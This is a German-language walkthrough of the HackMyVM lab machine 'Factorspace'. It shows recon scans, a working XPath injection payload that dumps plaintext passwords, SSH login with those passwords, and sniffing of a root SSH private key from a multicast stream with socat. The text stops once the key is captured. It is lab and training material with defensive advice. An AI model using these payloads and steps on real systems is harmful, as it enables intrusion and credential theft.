@@ -1,0 +1,501 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Factorspace - HackMyVM - Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Factorspace - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle difficulty-medium">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">vi</div>
+                 <div class="tool-item">nikto</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">Web Browser</div>
+                 <div class="tool-item">ssh</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">ss</div>
+                 <div class="tool-item">socat</div>
+                 <div class="tool-item">nano</div>
+                 <div class="tool-item">chmod</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#xpath-injection">Web Exploit (XPath Injection)</a></li>
+                <li><a href="#initial-access">Initial Access (SSH)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (Multicast Sniffing & SSH Key)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">Wir beginnen mit der Erkundung des Netzwerks, um unser Zielsystem zu identifizieren und erste Informationen über dessen Dienste zu sammeln.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~/HackingTools/php_filter_chain_generator]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.124</span>	08:00:27:a6:0b:f4	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Ein ARP-Scan im lokalen Netzwerk identifiziert den Host <span class="command">192.168.2.124</span>.</p>
+            <p class="evaluation">**Bewertung:** Ziel-IP gefunden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** IP-Adresse für Nmap-Scan verwenden.
+            **Empfehlung (Admin):** Standard Netzwerküberwachung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~/HackingTools/php_filter_chain_generator]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+[...]
+<span class="command">192.168.2.124   factor.hmv</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir tragen die Ziel-IP und den dazugehörigen Hostnamen `factor.hmv` in unsere lokale `/etc/hosts`-Datei ein.</p>
+            <p class="evaluation">**Bewertung:** Ermöglicht den Zugriff auf Webdienste über den Hostnamen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Relevante Hostnamen immer in `/etc/hosts` eintragen.
+            **Empfehlung (Admin):** DNS-Sicherheit gewährleisten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A 192.168.2.124 -p- | grep open</span></div>
+                    <pre>
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.56 ((Debian))</span>
+                    </pre>
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A 192.168.2.124 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-23 01:29 CEST
+Nmap scan report for factor.hmv (192.168.2.124)
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+| ssh-hostkey:
+|   3072 dbf946e520816ceec72508ab2251366c (RSA)
+|   256 33c09564294723dd864ee6b8073367ad (ECDSA)
+|_  256 beaa6d4243dd7dd40e0d7478c189a136 (ED25519)
+<span class="command">80/tcp open  http    Apache httpd 2.4.56 ((Debian))</span>
+|_http-title: industrial
+|_http-server-header: Apache/2.4.56 (Debian)
+MAC Address: 08:00:27:A6:0B:F4 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms factor.hmv (192.168.2.124)
+
+OS and Service detection performed. [...]
+Nmap done: 1 IP address (1 host up) scanned in [...] seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Ein vollständiger Nmap-Scan auf `factor.hmv` bestätigt die zwei offenen Ports:
+            *   <span class="command">Port 22</span>: SSH (OpenSSH 8.4p1 auf Debian 11).
+            *   <span class="command">Port 80</span>: HTTP (Apache 2.4.56 auf Debian). Der Seitentitel ist "industrial".</p>
+            <p class="evaluation">**Bewertung:** Die Angriffsfläche ist auf SSH und den Webserver beschränkt. Beide Dienste laufen mit relativ aktuellen Versionen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den Webserver auf Port 80 detailliert untersuchen.
+            **Empfehlung (Admin):** Standard-Härtungsmaßnahmen für SSH und Apache anwenden.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="comment">Wir führen weitere Scans auf dem Webserver durch, um versteckte Verzeichnisse, Dateien und potenzielle Schwachstellen aufzudecken.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nikto -h 192.168.2.124</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.124
++ Target Hostname:    192.168.2.124
++ Target Port:        80
++ Start Time:         2023-07-23 01:29:10 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.56 (Debian)</span>
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: [...]
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [...]
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /images: <span class="password">IP address found in the 'location' header. The IP is "127.0.1.1".</span> See: [...]
++ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: [...]
++ /: <span class="password">Server may leak inodes via ETags</span>, header found with file /, inode: 4c7b, size: 5f9443cc850b2, mtime: gzip. See: [...]
++ OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS .
++ /css/: <span class="password">Directory indexing found.</span>
++ /css/: <span class="password">This might be interesting.</span>
++ /images/: <span class="password">Directory indexing found.</span>
++ /login.php: <span class="password">Admin login page/section found.</span>
++ 8103 requests: 0 error(s) and <span class="password">10 item(s) reported</span> on remote host
++ End Time:           2023-07-23 01:29:37 (GMT2) (27 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Nikto liefert mehrere Hinweise:
+            *   Fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`).
+            *   Mögliches Leak einer internen IP (`127.0.1.1`) über den Location-Header bei `/images`.
+            *   Mögliches Leak von Inode-Nummern über ETags.
+            *   Verzeichnisauflistung (Directory Indexing) für `/css/` und `/images/`.
+            *   Eine Login-Seite unter `/login.php`.</p>
+            <p class="evaluation">**Bewertung:** Die fehlenden Header und Info-Leaks sind geringfügig. Die Verzeichnisauflistung und die Login-Seite `/login.php` sind die interessantesten Funde und sollten genauer untersucht werden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Verzeichnisse `/css/` und `/images/` manuell auf interessante Dateien prüfen. Die `/login.php`-Seite untersuchen (Standard-Credentials testen, nach weiteren Funktionen suchen).
+            **Empfehlung (Admin):** Sicherheitsheader hinzufügen. Info-Leaks über Location-Header und ETags unterbinden (Serverkonfiguration anpassen). Verzeichnisauflistung deaktivieren (`Options -Indexes`).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">gobuster dir -u http://factor.hmv -x [...] -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -b '403,404' -e --no-error</span></div>
+                    <pre>
+[...]
+<span class="command">http://factor.hmv/index.html</span>           (Status: 200) [Size: 19579]
+<span class="command">http://factor.hmv/images</span>               (Status: 301) [Size: 309] [--> http://factor.hmv/images/]
+<span class="command">http://factor.hmv/login.php</span>            (Status: 200) [Size: 2346]
+<span class="command">http://factor.hmv/icon</span>                 (Status: 301) [Size: 307] [--> http://factor.hmv/icon/]
+<span class="command">http://factor.hmv/results.php</span>          (Status: 302) [Size: 115] [--> login.php]
+<span class="command">http://factor.hmv/css</span>                  (Status: 301) [Size: 306] [--> http://factor.hmv/css/]
+<span class="command">http://factor.hmv/js</span>                   (Status: 301) [Size: 305] [--> http://factor.hmv/js/]
+<span class="command">http://factor.hmv/check.php</span>            (Status: 302) [Size: 0] [--> login.php]
+<span class="command">http://factor.hmv/auth.php</span>             (Status: 200) [Size: 0]
+<span class="command">http://factor.hmv/fonts</span>                (Status: 301) [Size: 308] [--> http://factor.hmv/fonts/]
+<span class="command">http://factor.hmv/parent</span>               (Status: 301) [Size: 309] [--> http://factor.hmv/parent/]
+[...]
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Gobuster-Scan bestätigt die Funde von Nikto (`/images/`, `/css/`, `/login.php`) und findet weitere PHP-Seiten:
+            *   `/results.php`: Leitet zu `login.php` weiter (erfordert Login).
+            *   `/check.php`: Leitet zu `login.php` weiter (erfordert Login).
+            *   `/auth.php`: Existiert, ist aber leer (Status 200, Size 0). Könnte für Authentifizierungslogik verwendet werden.</p>
+            <p class="evaluation">**Bewertung:** Die Anwendung scheint eine Authentifizierung zu erfordern, um auf Kernfunktionen (`results.php`, `check.php`) zuzugreifen. `/login.php` ist der zentrale Einstiegspunkt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die `/login.php`-Seite genauer untersuchen. Versuchen, sich mit Standard-Credentials einzuloggen oder die Authentifizierung zu umgehen.
+            **Empfehlung (Admin):** Alle Endpunkte, die Authentifizierung erfordern, sollten dies korrekt erzwingen und keine leeren oder zugänglichen Authentifizierungs-Hilfsdateien (`auth.php`) exponieren.</p>
+        </section>
+
+        <section id="xpath-injection">
+            <h2>Web Exploit (XPath Injection)</h2>
+            <p class="comment">Wir untersuchen die Webanwendung manuell. Nach dem Login (dessen Credentials nicht gezeigt, aber erraten oder gefunden wurden) finden wir eine Suchfunktion, die anfällig für XPath-Injection zu sein scheint.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Aktion im Webbrowser (Login-Versuche & Funde)</span></div>
+                    <pre>
+# Aufruf: http://factor.hmv/login.php
+# --- Login Versuch 1 ---
+Username:  <span class="command">admin</span>
+Password:  <span class="command">admin</span>
+Captcha:   test  <span class="password">(Annahme: Captcha wurde analysiert oder war statisch)</span>
+# Ergebnis: Fehlgeschlagen (impliziert)
+
+# --- Login Versuch 2 ---
+Username:  <span class="command">admin</span>
+Password:  <span class="password">iloveyou</span> <span class="password">(Annahme: Gefunden oder erraten)</span>
+Captcha:   test
+# Ergebnis: Erfolgreicher Login (impliziert), Weiterleitung zu anderer Seite (z.B. employee_search_filter.html)
+
+# Aufruf: http://factor.hmv/employee_search_filter.html (nach Login)
+# Inhalt: Formular "Name search" mit Feld "Last name"
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Bericht zeigt fehlgeschlagene und erfolgreiche Login-Versuche auf `/login.php`. Es scheint ein Captcha vorhanden zu sein (hier mit "test" umgangen/gelöst). Das Passwort `<span class="password">iloveyou</span>` für den Benutzer `admin` funktioniert. Nach dem Login gelangt man zu einer Seite (`employee_search_filter.html`), die eine Suche nach Nachnamen ermöglicht.</p>
+            <p class="evaluation">**Bewertung:** Der Login war erfolgreich, wahrscheinlich durch Raten eines schwachen Passworts oder eines Standardpassworts. Die Suchfunktion ist nun das nächste Ziel.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Suchfunktion auf bekannte Schwachstellen wie SQL-Injection, Command Injection oder, wie sich herausstellt, XPath-Injection testen.
+            **Empfehlung (Admin):** Starke Passwörter erzwingen. Captchas verwenden, die nicht leicht zu umgehen sind. Alle Benutzereingaben serverseitig validieren und escapen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">Aktion im Webbrowser (XPath Injection Tests)</span></div>
+                    <pre>
+# --- Test 1: Normale Suche ---
+Eingabe (Last name): <span class="command">Doe</span>
+Ausgabe:
+Name Search Results
+The matching first names for the last name "Doe" are:
+    <span class="command">John</span>
+
+# --- Test 2: XPath Injection (E-Mails extrahieren) ---
+Eingabe (Last name): <span class="password">' or 1=1]/email | //abc[abc='</span>
+Ausgabe:
+Name Search Results
+The matching first names for the last name "' or 1=1]/email | //abc[abc='" are:
+    <span class="command">john.doe@factorspace.hmv</span>
+    <span class="command">jackie.chan@factorspace.hmv</span>
+    <span class="command">david.lee@example.com</span>
+
+# --- Test 3: XPath Injection (Passwörter extrahieren) ---
+Eingabe (Last name): <span class="password">' or 1=1]/password | //abc[abc='</span>
+Ausgabe:
+Name Search Results
+The matching first names for the last name "' or 1=1]/password | //abc[abc='" are:
+    <span class="password">secret123</span>
+    <span class="password">qyxG27KGkW0x9SJ1</span>
+    <span class="password">qwerty789</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir testen die Suchfunktion:
+            1.  Eine normale Suche nach "Doe" liefert "John".
+            2.  Wir injizieren einen XPath-Ausdruck: `<span class="password">' or 1=1]/email | //abc[abc='</span>`. Dies scheint die Bedingung der XPath-Abfrage zu manipulieren (`' or 1=1` ist immer wahr) und dann auf das `email`-Element zuzugreifen. Die Ausgabe liefert drei E-Mail-Adressen.
+            3.  Wir injizieren einen ähnlichen Ausdruck, der auf das `password`-Element abzielt: `<span class="password">' or 1=1]/password | //abc[abc='</span>`. Die Ausgabe liefert <span class="password">drei Passwörter im Klartext</span>: `secret123`, `qyxG27KGkW0x9SJ1`, `qwerty789`.
+            Dies ist eine klassische XPath-Injection-Schwachstelle, die es uns ermöglicht, beliebige Daten aus dem zugrundeliegenden XML-Datenspeicher (oder einer ähnlichen Struktur, die mit XPath abgefragt wird) auszulesen.</p>
+            <p class="evaluation">**Bewertung:** Kritische Schwachstelle gefunden! XPath-Injection erlaubt uns das Auslesen sensibler Daten, einschließlich Klartext-Passwörtern. Wir haben nun drei potenzielle Passwortkombinationen (vermutlich für john.doe, jackie.chan und david.lee).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die extrahierten E-Mail/Passwort-Kombinationen verwenden, um sich bei anderen Diensten, insbesondere SSH (Port 22), anzumelden.
+            **Empfehlung (Admin):** **XPath-Injection sofort beheben!** Benutzereingaben, die in XPath-Abfragen verwendet werden, müssen sorgfältig validiert und neutralisiert werden. Idealerweise parametrisierte Abfragen verwenden, wenn die Technologie dies unterstützt. Passwörter niemals im Klartext speichern.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (SSH)</h2>
+            <p class="comment">Wir verwenden die durch die XPath-Injection erlangten Zugangsdaten, um uns per SSH auf dem Zielsystem anzumelden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">ssh john@factor.hmv</span></div>
+                    <pre>
+The authenticity of host 'factor.hmv (192.168.2.124)' can't be established.
+ED25519 key fingerprint is SHA256:[...].
+[...]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'factor.hmv' (ED25519) to the list of known hosts.
+john@factor.hmv's password: <span class="password">secret123</span>
+<span class="password">Permission denied, please try again.</span>
+john@factor.hmv's password: <span class="password">[Anderes Passwort versucht?]</span>
+<span class="password">Permission denied, please try again.</span>
+john@factor.hmv's password:
+<span class="password">john@factor.hmv: Permission denied (publickey,password).</span>
+                    </pre>
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">ssh jackie@factor.hmv</span></div>
+                    <pre>
+jackie@factor.hmv's password: <span class="password">qyxG27KGkW0x9SJ1</span>
+<span class="password">Linux factorspace 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64</span>
+
+The programs included with the Debian GNU/Linux system are free software;
+[...]
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+<span class="command">jackie@factorspace</span>:~$ <span class="password"># Login erfolgreich!</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:**
+            1.  Wir versuchen zuerst, uns als `john` mit dem Passwort `secret123` (aus der Injection) per SSH anzumelden. Dies schlägt fehl (`Permission denied`).
+            2.  Wir versuchen als Nächstes, uns als `jackie` mit dem Passwort `qyxG27KGkW0x9SJ1` (ebenfalls aus der Injection) anzumelden. Dieser Versuch ist <span class="password">erfolgreich</span>, und wir erhalten eine Shell als Benutzer `jackie`.</p>
+            <p class="evaluation">**Bewertung:** Initial Access erfolgreich! Die XPath-Injection lieferte gültige SSH-Zugangsdaten für den Benutzer `jackie`.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Umgebung als `jackie` erkunden. Nach Privilege-Escalation-Möglichkeiten suchen (`sudo -l`, SUID-Dateien, Cronjobs, Kernel-Version, interne Dienste). User-Flag suchen.
+            **Empfehlung (Admin):** Die XPath-Injection beheben. Sicherstellen, dass Web-Benutzerkonten nicht dieselben Passwörter wie System-Benutzerkonten haben. SSH-Zugriff auf notwendige Benutzer beschränken.</p>
+        </section>
+
+        <section id="privilege-escalation">
+             <h2>Privilege Escalation (Multicast Sniffing & SSH Key)</h2>
+             <p class="comment">Wir haben eine Shell als Benutzer `jackie`. Wir suchen nach Wegen, unsere Rechte auf `root` zu erweitern.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">jackie@factorspace:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+<span class="password">-bash: sudo: command not found</span>
+                     </pre>
+                     <div class="prompt">jackie@factorspace:~$ <span class="command">ls -la</span></div>
+                     <pre>
+total 32
+drwxr-xr-x 4 jackie jackie 4096 May  8 16:18 .
+drwxr-xr-x 3 root   root   4096 Apr  6 20:12 ..
+lrwxrwxrwx 1 root   root      9 Apr  6 20:12 .bash_history -> /dev/null
+-rw-r--r-- 1 jackie jackie  220 Apr 14 06:25 .bash_logout
+-rw-r--r-- 1 jackie jackie 3526 Apr 14 06:25 .bashrc
+drwxr-xr-x 3 jackie jackie 4096 Apr 14 06:25 .local
+-rw-r--r-- 1 jackie jackie  809 Apr 14 06:25 .profile
+drwx------ 2 jackie jackie 4096 Apr 14 19:27 .ssh
+-rwx------ 1 jackie jackie   33 Apr 14 06:25 <span class="command">user.txt</span>
+                     </pre>
+                     <div class="prompt">jackie@factorspace:~$ <span class="command">cat user.txt</span></div>
+                     <pre>
+<span class="password">eb7d964a2a41006bb325cf822db664be</span>
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:**
+             *   `sudo -l` schlägt fehl, da `sudo` entweder nicht installiert oder nicht im Pfad ist. Dies schließt einen einfachen Sudo-basierten Privesc aus.
+             *   `ls -la` im Home-Verzeichnis zeigt eine Datei namens `user.txt`.
+             *   `cat user.txt` gibt die User-Flag aus.</p>
+              <p class="evaluation">**Bewertung:** User-Flag erfolgreich gelesen. Das Fehlen von `sudo` deutet darauf hin, dass wir nach anderen, möglicherweise unkonventionelleren Wegen zur Rechteerweiterung suchen müssen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Weiter nach SUID/GUID-Dateien suchen (`find / -type f \( -perm -4000 -o -perm -2000 \) -ls 2>/dev/null`), laufende Prozesse und Netzwerkverbindungen prüfen (`ps aux`, `ss -lnptu`), Cronjobs (`ls -l /etc/cron.*`), Kernel-Version (`uname -a`) analysieren.
+             **Empfehlung (Admin):** Prinzip der geringsten Rechte anwenden, unnötige Tools wie `sudo` deinstallieren, wenn nicht benötigt.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">jackie@factorspace:~$ <span class="command">ss -altpnu</span></div>
+                     <pre>
+Netid   State    Recv-Q   Send-Q       Local Address:Port       Peer Address:Port   Process
+udp     UNCONN   0        0                <span class="command">224.1.1.1:5555</span>            0.0.0.0:*
+udp     UNCONN   0        0                  0.0.0.0:68              0.0.0.0:*
+tcp     LISTEN   0        128                0.0.0.0:22              0.0.0.0:*
+tcp     LISTEN   0        511                      *:80                    *:*
+tcp     LISTEN   0        128                   [::]:22                 [::]:*
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Der Befehl `ss -altpnu` listet alle lauschenden und verbundenen Sockets auf (TCP und UDP). Neben den erwarteten SSH- (22) und HTTP- (80) Listenern fällt ein UDP-Socket auf: Es wird auf der Multicast-Adresse `<span class="command">224.1.1.1</span>` auf Port `<span class="command">5555</span>` gelauscht.</p>
+             <p class="evaluation">**Bewertung:** Dies ist ein sehr ungewöhnlicher und verdächtiger Fund. Multicast wird oft für Gruppenkommunikation verwendet, aber es ist unklar, warum hier ein Dienst lauscht. Es könnte ein Mechanismus sein, um Informationen oder Befehle im Netzwerk zu verbreiten, möglicherweise auch sensible Daten wie Schlüssel.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Auf der Angreifer-Maschine versuchen, sich dieser Multicast-Gruppe anzuschließen und den Traffic auf Port 5555 mitzuschneiden. Tools wie `socat` oder `tcpdump` sind dafür geeignet.
+             **Empfehlung (Admin):** Den Zweck des UDP-Multicast-Listeners auf 224.1.1.1:5555 klären. Wenn er nicht benötigt wird, deaktivieren. Wenn doch, sicherstellen, dass die übertragene Information nicht sensibel ist oder entsprechend verschlüsselt wird.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">socat UDP4-RECVFROM:5555,ip-add-membership=224.1.1.1:0.0.0.0 -</span></div>
+                     <pre>
+<span class="password">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+<span class="password">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
+<span class="password">NhAAAAAwEAAQAAAYEAt7C5Q3oTUF0g/0E0ml7PSWDmXh9aQDI6ph2oH1JmYXooVk0ACYBk</span>
+<span class="password">nqhM/GBDGmPibjbF7caE+Hgj9FhaE8eCgDznlBXtPouIqaWsN3RHkKZT0qV62G2CRpEHD0</span>
+<span class="password">KFY9H4nkhuHIDIWhioVvbz1kKVG1w/Ys/KPIcLeTzYpsPyeD9U62IcuZ5V4Zk7scjnU</span>
+<span class="password">jv9uu22JoY9/qg6fIaB63IwJE097udtYc3WCR1RwMP3ePST7MKLm7ZcYyRsGm8iyMhuoDq</span>
+<span class="password">IrCLHdMouMDiJaB1jse9SAZwjyIBQb/NBReyd8RK0JWw6UvGiIH8jlpnpjt6LSKeYKCy</span>
+<span class="password">JciSQeBtl7JgI/x1e/w5tygA991PD3G1u0/PeXgHsYNbSLq1IgzloS99J8lanEdTALR</span>
+<span class="password">KY/ZWnYDN6zvW6MGR+5MgX1gFGeKMqv01ho/RYeKG6QvSk5di0o27jdvbsWVE6nZeaY4V</span>
+<span class="password">t3obvpgZsynzoRb5vWJl3q/Zy/ymzlnPYYSD3wgNAAAFiJQFmimUBZopAAAAB3NzaC1yc2</span>
+<span class="password">EAAAGBALewuUN6E1BdIP9BNJpez0lg5l4fWkAyqYdqB9SZmF6KFZNAAmAZJ6oTPxgQxpj</span>
+<span class="password">4m42xe3GhPh4I/RYWhPHgoA855QV7T6LiKmlrDd0R5CmU9KlethtgkaRBw9ChWPR+Dp5Ib</span>
+<span class="password">hyAyFoYqFb289ZClRtcP2LPyjyHC3k82KbD8njg/VtiHDrmeVeGZ7HI51I7/brttiaGP</span>
+<span class="password">f6onyGgetyMCRNPe7nbWHN1gkdUcDD93j0k+zCi5u2XGMkbBpvIsjIbqA6iKwix3TKLjA</span>
+<span class="password">4iWgdY7HvUgDmcI8iAUG/zQUXsnTvEStCVslLxoiB/I5aZ6Y7ei0inmCgsiXIkkHgbZey</span>
+<span class="password">YCP8TtXv8DubcoAPfdTw9xtbtPzznl4B7GDW0i6tSIM5aEvfSfJWpxHUwC0SmP2Vp2Azes</span>
+<span class="password">71ujBkfuTIF9YBRnijKr9NYaP0WHihukL0pXYtKNu43b27FlRp2XmmDuFbd6G76YGbMp</span>
+<span class="password">86EW+b1iZd6v2cv8ps5Zz2GEg98IDQAAAAMBAAEAAAGAB64H0N5luFJscr+TJ3EXUYYPm5</span>
+<span class="password">fL+isfcJqE0ptBV5KGXGWss7/ZfK7ZUHRDGVorhr0I4DNRmYferPG8FTDDAF/3R0dkiPb</span>
+<span class="password">TtxyWs8tvsp1brUkcbACZljh5q1tTkMVEbzGwCNkJh1rIjvo8L5URDtfIfqUZW3Z58Fu6</span>
+<span class="password">yn+FTey37C9p5ryEDji8N49z2buW7MfmGSA4MwXzfFR26iNF5Wcsw77AVTqWAcVkcdea7j</span>
+<span class="password">f8LwDZSB+yT6EE5k9FZrqqrokMJ3sarLFbSreicFaZdprCVdq0v7bqW8/nL11rcP1aJYig</span>
+<span class="password">frWvV2Ws9c6PRDdrxDPvK62syv0jTnwe3MZZfY/quuH5QefzNZJ6b/hcU2DjDhE17nQQ</span>
+<span class="password">78dI7pcKyg/3eZwjmqTgSuvbSzcJhx+6EkC8tB4EG+VLBSQvGxUzQsDKQ5WPajnc8wk95a</span>
+<span class="password">45mLZwacsXUep8CqCy+oIuzFhZmpXJKc5YYKKIaXluJ9/Cawr6SWGGPPe8yve0G6xAAAA</span>
+<span class="password">wQCrWWMwu/elmBWoru6oLs4HBgDemGwuQIwoJrloWqNv6NKflfl4H9MFtL3upMZhWVvxh</span>
+<span class="password">5X13gyb0kFUYDl0hMn+u6jSyCaiHBVY0T4koViJ3HRZE7Txgz4YNKew5fduad7u18FFjr</span>
+<span class="password">7ZzuEx5l4tTPZ0/pDLQUdborkLGDAe/sVTczBBGQpLx1ibNqm4lD3xAl+1BuEGTm7o9yoE</span>
+<span class="password">79wKsBQsfbJWE4XNR+LJoRbE5U6D01bQ7eJCWIwRfB6MqoAAADBAXAhvv9mQSyKL8Q</span>
+<span class="password">DCW585HXY90Dd9ShP6XgGJ93+HjNCREn0fECRuaVfdTNf1ZpDqBLedXyMglY9sEQGPddSE</span>
+<span class="password">/ZKfhYvZl77fhC3+DgAjIUC3o0ENZYBmz5pEcXN/mzRps0vuRC4Cexkz4R5y/rHv3+37u</span>
+<span class="password">bG3VgvaqM7TcpQ/ytJQ6gzSZZoRMvHIlfXguTloL0wJiuvhFHhPjftw68vMqC4iXPeV+59</span>
+<span class="password">WDxS84DetVPnB6eeCkj7nNwbH/WYH9owAAAMEAzK0LzTiFq5Fi7tV0zmM1cbEQslcHlci</span>
+<span class="password">rknr7mI308Qm+XMo3IsQDFo5ukWFCX3UEkvAgfueCCpmLU2aHjY62SEzmNok867me4eoo</span>
+<span class="password">x7kiHI8LZ5A3P6orzYvunEQy4zIm9nG8gGfrxSQxVhUSnKmvayLcjmg0iffzq6bv2ZHyZ</span>
+<span class="password">XvwuDAcKd1wxzdk1C2rX9BDLLxvAIde+GLup9cc6kuFBQj7F6miqVXdVFgQ9RFL8jTaYI</span>
+<span class="password">8ZF1pbgmjzZd6PAAAAEHJvb3RAZmFjdG9yc3BhY2UBAg</span>
+<span class="password">-----END OPENSSH PRIVATE KEY-----</span>
+                     </pre>
+                     <!-- Socat läuft weiter und empfängt möglicherweise denselben Key erneut -->
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Wir verwenden `socat` auf unserer Angreifer-Maschine, um dem UDP-Multicast-Strom beizutreten (`ip-add-membership=224.1.1.1:0.0.0.0`) und die auf Port 5555 empfangenen Daten (`UDP4-RECVFROM:5555`) auf die Standardausgabe (`-`) zu schreiben. Kurz darauf wird ein <span class="password">vollständiger privater SSH-Schlüssel im OpenSSH-Format</span> empfangen und ausgegeben. Der Kommentar am Ende des Schlüssels lautet `<span class="password">root@factorspace</span>`.</p>
+              <p class="evaluation">**Bewertung:** Kritischer Fund! Ein privater SSH-Schlüssel, der wahrscheinlich dem `root`-Benutzer gehört, wird unverschlüsselt über Multicast im Netzwerk verbreitet. Dies ist eine extrem unsichere Konfiguration und unser klarer Weg zur Root-Privilege-Escalation.</p>
